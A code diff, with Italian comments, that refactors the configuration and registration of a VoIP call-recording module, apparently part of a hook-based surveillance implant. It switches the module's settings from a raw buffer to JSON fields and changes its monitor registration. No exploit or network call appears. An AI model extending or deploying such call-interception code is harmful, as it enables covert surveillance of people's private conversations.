@@ -2752,31 +2752,20 @@ DWORD __stdcall PM_VoipRecordStartStop(BOOL bStartFlag, BOOL bReset)
 }
 
 
-DWORD __stdcall PM_VoipRecordInit(BYTE *conf_ptr, BOOL bStartFlag)
+DWORD __stdcall PM_VoipRecordInit(JSONObject elem)
 {
-	DWORD *pdwparam;
 	// Inizializza la dimensione dei sample su disco
 	// e il fattore di compressione
-	if (conf_ptr) {
-		pdwparam = (DWORD *)conf_ptr;
-		max_sample_size = *pdwparam;
-		pdwparam++;
-		compress_factor = *pdwparam;
+	max_sample_size = (DWORD) elem[L"buffer"]->AsNumber()*1024;
+	compress_factor = (DWORD) elem[L"compression"]->AsNumber();
 
-		// Riallochiamo l'array per i PCM
-		// Siamo sicuri di non perdere dati, perche' la Init viene fatta sempre dopo lo Stop
-		// Che avra' flushato entrambe le code e in questo momento il thread di dispatch e' ancora fermo
-		SAFE_FREE(wave_array[INPUT_ELEM]);
-		SAFE_FREE(wave_array[OUTPUT_ELEM]);
-		wave_array[INPUT_ELEM]  = (BYTE *)malloc(max_sample_size + MAX_MSG_LEN * 2);
-		wave_array[OUTPUT_ELEM] = (BYTE *)malloc(max_sample_size + MAX_MSG_LEN * 2);
-	} else {
-		// Inizializza di default a DEFAULT_SAMPLE_SIZE
-		max_sample_size = DEFAULT_SAMPLE_SIZE;
-		compress_factor = DEFAULT_COMPRESSION;
-	}
-
-	PM_VoipRecordStartStop(bStartFlag, TRUE);
+	// Riallochiamo l'array per i PCM
+	// Siamo sicuri di non perdere dati, perche' la Init viene fatta sempre dopo lo Stop
+	// Che avra' flushato entrambe le code e in questo momento il thread di dispatch e' ancora fermo
+	SAFE_FREE(wave_array[INPUT_ELEM]);
+	SAFE_FREE(wave_array[OUTPUT_ELEM]);
+	wave_array[INPUT_ELEM]  = (BYTE *)malloc(max_sample_size + MAX_MSG_LEN * 2);
+	wave_array[OUTPUT_ELEM] = (BYTE *)malloc(max_sample_size + MAX_MSG_LEN * 2);
 	return 1;
 }
 
@@ -2804,10 +2793,5 @@ DWORD __stdcall PM_VoipRecordUnregister()
 
 void PM_VoipRecordRegister()
 {
-	// L'hook viene registrato dalla funzione HM_InbundleHooks
-	AM_MonitorRegister(PM_VOIPRECORDAGENT, (BYTE *)PM_VoipRecordDispatch, (BYTE *)PM_VoipRecordStartStop, (BYTE *)PM_VoipRecordInit, (BYTE *)PM_VoipRecordUnregister);
-
-	// Inizialmente i monitor devono avere una configurazione di default nel caso
-	// non siano referenziati nel file di configurazione (partono comunque come stoppati).
-	PM_VoipRecordInit(NULL, FALSE);
+	AM_MonitorRegisterBSON(L"call", PM_VOIPRECORDAGENT, (BYTE *)PM_VoipRecordDispatch, (BYTE *)PM_VoipRecordStartStop, (BYTE *)PM_VoipRecordInit, (BYTE *)PM_VoipRecordUnregister);
 }
